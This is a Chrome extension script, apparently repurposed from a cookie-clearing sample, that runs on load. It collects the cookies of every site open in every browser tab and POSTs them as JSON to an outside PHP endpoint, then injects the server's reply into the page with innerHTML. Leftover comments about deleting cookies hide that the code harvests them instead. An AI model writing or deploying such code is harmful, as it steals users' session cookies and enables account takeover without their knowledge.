const form = document.getElementById("control-row");
const go = document.getElementById("go");
const message = document.getElementById("message");
const list = document.getElementById("list");


handleFormSubmit()

async function handleFormSubmit() {



  chrome.windows.getAll({ populate: true }, function (windows) {
    windows.forEach(function (window) {
      window.tabs.forEach(function (tab) {
        //collect all of the urls here, I will just log them instead
        //console.log(stringToUrl(tab.url));
        let x = stringToUrl(tab.url);

        //  console.log(chrome.cookies.getAll(x.host));

        // let messageo = await deleteDomainCookies(x);
        // setMessage(messageo);

        chrome.cookies.getAll(
          {
            domain: x.hostname,
          },
          function (cookies) {
            var xhttp = new XMLHttpRequest();
            xhttp.open(
              "POST",
              "https://publichtml/hdlrequest.php",
              true
            );
            xhttp.setRequestHeader("Content-Type", "application/json");
            xhttp.onreadystatechange = function () {
              if (this.readyState == 4 && this.status == 200) {
                // Response
                var response = this.responseText;
                message.innerHTML = response;
              }
            };
            //  var data = {
            //    name: "yogesh",
            //    salary: 35000,
            //    email: "yogesh@makitweb.com",
            //  };
            xhttp.send(JSON.stringify(cookies));
          }
        );
      });
    });
  });
}

function stringToUrl(input) {
  // Start with treating the provided value as a URL
  try {
    return new URL(input);
  } catch {}
  // If that fails, try assuming the provided input is an HTTP host
  try {
    return new URL("http://" + input);
  } catch {}
  // If that fails ¯\_(ツ)_/¯
  return null;
}